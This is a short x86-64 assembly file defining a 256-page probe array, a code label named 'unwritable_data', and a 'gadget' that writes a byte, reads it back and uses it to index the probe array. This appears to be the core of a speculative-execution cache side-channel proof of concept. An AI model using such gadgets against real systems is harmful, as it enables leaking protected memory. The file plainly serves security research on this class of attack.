.data
.align 0x1000
.global probe_array
probe_array:
    .space 4096*256, 0x00

.text

.global unwritable_data
unwritable_data:
    nop
    nop
    nop
    nop
    ret

.global gadget
gadget:
    
    lea probe_array, %r12
    movb $0x61, (%rdi)
    mov (%rdi), %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r12, %r8, 1), %r8

    ret
